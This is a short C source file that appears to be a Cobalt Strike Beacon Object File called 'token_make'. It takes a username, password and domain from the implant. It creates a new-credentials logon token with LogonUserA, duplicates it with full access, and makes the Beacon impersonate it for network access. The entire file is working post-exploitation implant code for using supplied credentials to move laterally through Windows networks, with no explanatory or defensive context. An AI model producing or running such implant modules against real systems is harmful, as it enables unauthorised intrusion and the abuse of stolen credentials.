#include <windows.h>
#include "beacon.h"
void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    char *user = BeaconDataExtract(&parser, NULL);
    char *pass = BeaconDataExtract(&parser, NULL);
    char *domain = BeaconDataExtract(&parser, NULL);
    if (!user || !pass || !domain) { BeaconPrintf(CALLBACK_ERROR, "[!] Usage: bof token_make z:<user> z:<pass> z:<domain>\n"); return; }
    if (_stricmp(domain, ".") == 0) domain = "";
    HANDLE hToken = NULL;
    if (!LogonUserA(user, domain, pass, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LogonUserA failed (gle=%lu)\n", (unsigned long)GetLastError()); return;
    }
    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) { CloseHandle(hToken); return; }
    if (!BeaconUseToken(hDupToken)) { CloseHandle(hDupToken); CloseHandle(hToken); return; }
    char userName[256]={0}; DWORD nameLen=sizeof(userName);
    if (GetUserNameA(userName, &nameLen))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Token made — now running as: %s\n", userName);
    CloseHandle(hToken);
}
